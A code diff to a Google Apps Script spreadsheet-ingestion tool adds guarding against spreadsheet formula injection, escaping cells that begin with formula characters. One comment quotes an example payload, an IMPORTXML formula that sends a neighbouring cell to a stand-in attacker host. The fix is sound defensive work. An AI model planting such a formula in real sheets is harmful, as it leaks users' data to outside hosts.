@@ -753,18 +753,76 @@ function upsertRows_(sheet, normalizedRows, keyCols, amountCol, stampCol) {
   return { rowsAdded: toAppend.length, rowsUpdated: rowsUpdated, duplicatesSkipped: duplicatesSkipped, updates: updates };
 }
 
+/* ------------------------------------------------------------------ *
+ * Spreadsheet formula injection (CWE-1236)
+ * ------------------------------------------------------------------ */
+
+// Google Sheets evaluates a cell whose text begins with one of these as a
+// FORMULA. '@' is Excel-only but is included because these tabs get exported.
+var SHEET_FORMULA_TRIGGERS_ = ['=', '+', '-', '@'];
+var SHEET_TEXT_GUARD_ = "'";
+
+/**
+ * Force a value to be stored as literal text when it would otherwise be read
+ * as a formula. Strings only — Numbers and Dates are returned untouched, so
+ * every money/date column is unaffected.
+ *
+ * Why this exists: normalizeSupplierRow/normalizeRevenueRow only String()-
+ * coerce, and appendRow writes the result verbatim. Supplier names scraped
+ * from portals, invoice_refs OCR'd out of PDFs, and the Order app's shopId ->
+ * `customer` all reach cells this way, so an upstream value of
+ * `=IMPORTXML("https://attacker/"&A1,"//x")` becomes a live formula that runs
+ * the moment Jake opens the Sheet — exfiltrating the row next to it.
+ *
+ * A leading apostrophe is the Sheets-native "treat as text" marker. It is a
+ * formatting marker, not part of the value, so it must never be allowed to
+ * change a dedup key — rowKey_ strips it before comparing (see below), which
+ * makes this safe whether or not Sheets echoes the apostrophe back on read.
+ *
+ * Idempotent: an already-guarded value is returned unchanged, so applying
+ * this twice (e.g. ingest, then an _archive copy-back) never doubles up.
+ */
+function sheetSafeCell_(v) {
+  if (typeof v !== 'string' || v.length === 0) return v;
+  if (v.charAt(0) === SHEET_TEXT_GUARD_) return v; // already guarded
+  if (SHEET_FORMULA_TRIGGERS_.indexOf(v.charAt(0)) === -1) return v;
+  return SHEET_TEXT_GUARD_ + v;
+}
+
+/** Map sheetSafeCell_ over one row. Returns a new array; never mutates. */
+function sheetSafeRow_(row) {
+  if (!row || typeof row.length !== 'number') return row;
+  var out = [];
+  for (var i = 0; i < row.length; i++) out.push(sheetSafeCell_(row[i]));
+  return out;
+}
+
+/** Map sheetSafeRow_ over a block of rows. Returns a new array. */
+function sheetSafeBlock_(rows) {
+  var out = [];
+  for (var i = 0; i < rows.length; i++) out.push(sheetSafeRow_(rows[i]));
+  return out;
+}
+
+/** Strip the text-guard apostrophe so a guarded value keys identically to
+ *  its unguarded twin. Load-bearing: without it, guarding invoice_ref would
+ *  orphan every existing row and re-add the money under a new key. */
+function sheetUnguardCell_(v) {
+  return (typeof v === 'string' && v.charAt(0) === SHEET_TEXT_GUARD_) ? v.slice(1) : v;
+}
+
 function rowKey_(rowArray, keyCols) {
   var parts = [];
   for (var i = 0; i < keyCols.length; i++) {
     var v = rowArray[keyCols[i]];
     v = (v instanceof Date) ? coerceDateStr_(v) : v;
-    parts.push(String(v).trim().toLowerCase());
+    parts.push(String(sheetUnguardCell_(v)).trim().toLowerCase());
   }
   return parts.join('||');
 }
 
 function appendNewRows_(sheet, rows) {
-  for (var i = 0; i < rows.length; i++) sheet.appendRow(rows[i]);
+  for (var i = 0; i < rows.length; i++) sheet.appendRow(sheetSafeRow_(rows[i]));
 }
 
 /* ------------------------------------------------------------------ *
@@ -876,7 +934,7 @@ function labourWeeklyPull_(weeks, ss, summSheet, pulledAt) {
     // department-filtered read.
     var lKey = ws + '||' + location;
     if (!labourKeys[lKey]) {
-      labourSheet.appendRow([ws, we, location, total, isoWeek, pulledAt, DEFAULT_DEPARTMENT]);
+      labourSheet.appendRow(sheetSafeRow_([ws, we, location, total, isoWeek, pulledAt, DEFAULT_DEPARTMENT]));
       labourKeys[lKey] = true;
       labourAdded++;
     }
@@ -1082,7 +1140,7 @@ function fillBlankDepartments_(sheet, headers, dryRun, tabName) {
       if (breakHere) {
         var runRows = writes.slice(start, i);
         sheet.getRange(runRows[0], deptCol + 1, runRows.length, 1)
-          .setValues(block.slice(start, i));
+          .setValues(sheetSafeBlock_(block.slice(start, i)));
         start = i;
       }
     }
@@ -1489,7 +1547,7 @@ function cleanupOnlineRevenueSummaryRows(dryRun) {
     // Pass 2: back up EVERY matched row before a single deleteRow fires. A
     // half-backed-up delete is worse than no cleanup at all.
     var backup = ensureSheet(ss, ONLINE_REVENUE_BACKUP_TAB, SUMMARY_HEADERS);
-    for (var b = 0; b < matches.length; b++) backup.appendRow(data[matches[b]]);
+    for (var b = 0; b < matches.length; b++) backup.appendRow(sheetSafeRow_(data[matches[b]]));
     Logger.log('cleanupOnlineRevenueSummaryRows: backed up ' + matches.length +
       ' row(s) to ' + ONLINE_REVENUE_BACKUP_TAB);
 
@@ -2183,7 +2241,7 @@ function restoreWeekFromHealBackup_(week) {
     }
     var appended = 0;
     for (var s = 0; s < restorable.length; s++) {
-      summSheet.appendRow(restorable[s].slice(0, SUMMARY_BACKUP_RUNID_COL));
+      summSheet.appendRow(sheetSafeRow_(restorable[s].slice(0, SUMMARY_BACKUP_RUNID_COL)));
       appended++;
     }
     return { restored: appended, deleted: deleted, preserved: preserved };
@@ -2232,7 +2290,7 @@ function healBackupWeek_(week, ctx) {
     rowsForWeek.push([week, weekEnd, '', '', 0, ctx.extractedAt, '', SUMMARY_HEAL_EMPTY_MARKER_KIND_, ctx.runId]);
   }
   for (var r = 0; r < rowsForWeek.length; r++) {
-    ctx.backupSheet.appendRow(rowsForWeek[r]);
+    ctx.backupSheet.appendRow(sheetSafeRow_(rowsForWeek[r]));
   }
   ctx.backedUpWeeks[week] = true;
   return true;
@@ -2785,7 +2843,7 @@ function archiveAndPurge_(sourceSheet, archiveSheet, cutoffDateStr) {
   if (toArchive.length) {
     archiveSheet
       .getRange(archiveSheet.getLastRow() + 1, 1, toArchive.length, numCols)
-      .setValues(toArchive);
+      .setValues(sheetSafeBlock_(toArchive));
   }
 
   // toDelete is descending; collapse each contiguous run into one deleteRows.
